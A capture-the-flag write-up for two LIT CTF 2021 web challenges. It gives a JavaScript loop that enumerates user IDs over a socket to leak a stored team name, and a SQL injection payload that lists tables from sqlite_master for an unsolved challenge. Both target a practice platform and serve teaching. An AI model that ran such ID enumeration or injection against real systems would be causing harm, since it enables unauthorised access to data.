# LIT CTF 2021 Web Writeups

## LIT BUGS
> Last year’s LIT platform may or may not have had some security vulnerabilities. We have created a simplified version of last year’s platform called LIT BUGS (Lexington Informatics Tournament’s Big Unsafe Grading System). The flag is the team name of the only registered user. Visit LIT BUGS [here](http://websites.litctf.live:8000/)

We can see in the JS of the contest.html page that the frontend retrieves the team name with a reqName request by sending an ID.
All IDs are random numbers from 0 to 999, so we can simply send each ID until we get a response with the flag.

```js
socket.on("reqNameRes",console.log);
for (let i=0; i<=1000; i++) {
    socket.emit("reqName", i);
}
```


## Alex Fan Club
### unsolved
https://stackoverflow.com/questions/82875/how-to-list-the-tables-in-a-sqlite-database-file-that-was-opened-with-attach

https://security.stackexchange.com/questions/127655/would-removing-spaces-in-a-string-protect-against-sql-injection

`' union select name from db.sqlite_master where name like 'table`